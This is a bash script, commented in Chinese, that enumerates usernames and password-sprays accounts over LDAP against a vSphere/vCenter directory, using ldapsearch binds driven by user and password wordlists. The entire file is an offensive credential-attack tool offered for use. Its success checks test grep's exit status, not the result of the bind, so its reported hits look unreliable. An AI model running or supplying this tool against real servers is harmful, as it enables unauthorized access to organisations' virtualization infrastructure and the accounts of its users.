#!/bin/bash

# 颜色定义
GREEN='\033[0;32m'  # 绿色
RED='\033[0;31m'    # 红色
YELLOW='\033[1;33m' # 黄色
NC='\033[0m'        # No Color

# 显示帮助信息
function usage() {
    echo -e "${YELLOW}[*] Usage: $0 -h <host> [-u <username>] [-uf <user file>] [-p <password>] [-pf <password file>]${NC}"
    exit 1
}

# 初始化默认参数
host=""
single_user=""
user_file=""
single_pass=""
pass_file=""

# 参数解析
while [[ $# -gt 0 ]]; do
    case "$1" in
        -h|--host)
            host="$2"
            shift 2
            ;;
        -u|--user)
            single_user="$2"
            shift 2
            ;;
        -uf|--userfile)
            user_file="$2"
            shift 2
            ;;
        -p|--password)
            single_pass="$2"
            shift 2
            ;;
        -pf|--passfile)
            pass_file="$2"
            shift 2
            ;;
        -*|--*)
            echo -e "${RED}[-] Unknown option $1${NC}"
            usage
            ;;
        *)
            break
            ;;
    esac
done

# 检查是否指定了主机
if [[ -z "$host" ]]; then
    echo -e "${RED}[-] Error: Host (-h) is required.${NC}"
    usage
fi

# LDAP 基础 DN
base_dn="DC=vsphere,DC=local"

# 函数：查询用户名是否存在
function ldap_enum() {
    local username=$1
    echo -e "${YELLOW}[*] Checking user: $username${NC}"
    result=$(ldapsearch -x -H ldap://"$host" -D "CN=$username,CN=Users,$base_dn" -w dummy_pass -b "$base_dn" 2>/dev/null | grep "# numEntries")

    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] User found: $username${NC}"
        return 0
    else
        echo -e "${RED}[-] User not found: $username${NC}"
        return 1
    fi
}

# 函数：密码喷洒
function password_spray() {
    local username=$1
    local password=$2
    echo -e "${YELLOW}[*] Trying password '$password' for user: $username${NC}"
    result=$(ldapsearch -x -H ldap://"$host" -D "CN=$username,CN=Users,$base_dn" -w "$password" -b "$base_dn" 2>/dev/null | grep "# numEntries")

    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Password success for user: $username${NC}"
    else
        echo -e "${RED}[-] Password failed for user: $username${NC}"
    fi
}

# 如果没有 -u 或 -uf 参数，默认使用 root 用户
if [[ -z "$single_user" && -z "$user_file" ]]; then
    single_user="root"
fi

# 先枚举用户
valid_users=()

# 单个用户枚举
if [[ -n "$single_user" ]]; then
    if ldap_enum "$single_user"; then
        valid_users+=("$single_user")
    fi
fi

# 用户名字典文件枚举
if [[ -n "$user_file" ]]; then
    if [[ ! -f "$user_file" ]]; then
        echo -e "${RED}[-] Error: File $user_file not found.${NC}"
        exit 1
    fi
    while read -r username; do
        if ldap_enum "$username"; then
            valid_users+=("$username")
        fi
    done < "$user_file"
fi

# 如果没有找到有效用户则退出
if [[ ${#valid_users[@]} -eq 0 ]]; then
    echo -e "${RED}[-] No valid users found. Exiting.${NC}"
    exit 1
fi

# 密码喷洒流程
if [[ -n "$single_pass" ]]; then
    # 对每个有效用户使用单个密码喷洒
    for user in "${valid_users[@]}"; do
        password_spray "$user" "$single_pass"
    done
fi

if [[ -n "$pass_file" ]]; then
    # 检查密码文件是否存在
    if [[ ! -f "$pass_file" ]]; then
        echo -e "${RED}[-] Error: Password file $pass_file not found.${NC}"
        exit 1
    fi
    # 对每个有效用户使用密码字典喷洒
    while read -r password; do
        for user in "${valid_users[@]}"; do
            password_spray "$user" "$password"
        done
    done < "$pass_file"
fi

# 如果没有提供密码或密码文件，提示用法
if [[ -z "$single_pass" && -z "$pass_file" ]]; then
    echo -e "${RED}[-] Error: Either -p <password> or -pf <password file> is required for password spraying.${NC}"
    usage
fi
